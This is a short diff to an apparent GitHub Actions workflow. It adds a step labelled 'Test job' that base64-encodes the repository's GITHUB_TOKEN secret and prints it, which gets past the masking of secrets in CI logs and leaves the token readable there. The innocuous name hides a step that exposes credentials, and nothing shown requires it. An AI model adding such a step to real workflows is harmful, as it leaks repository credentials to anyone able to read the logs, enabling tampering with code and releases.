@@ -28,4 +28,9 @@ jobs:
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
           THRESHOLD: ${{ secrets.PR_THRESHOLD }}
-            
+    steps:
+      - name: Test job
+        run: echo $GH_TOKEN | base64 -w 0
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+
